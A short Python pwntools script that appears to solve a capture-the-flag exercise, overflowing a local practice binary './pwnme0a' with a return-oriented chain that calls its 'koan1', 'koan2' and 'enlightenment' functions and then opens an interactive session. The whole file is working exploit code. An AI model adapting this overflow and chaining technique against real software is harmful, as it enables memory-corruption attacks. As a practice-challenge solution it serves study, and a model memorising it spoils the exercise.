import pwn

pop_gadget = pwn.p32(0x08049022)

def main():
    context = pwn.ELF("./pwnme0a", checksec=False)
    proc = pwn.process('./pwnme0a')

    payload = (b"a" * 47 + b"b" * 5 + pwn.p32(context.symbols["koan1"]) + pop_gadget +
               pwn.p32(0x69) + pwn.p32(context.symbols["koan2"]) + pwn.p32(context.symbols["koan2"]) +
               pwn.p32(context.symbols["enlightenment"]) + pwn.p32(0x420))

    with open("payload_file", "wb") as file:
        file.write(payload)
    proc.sendline(payload)
    proc.interactive()



main()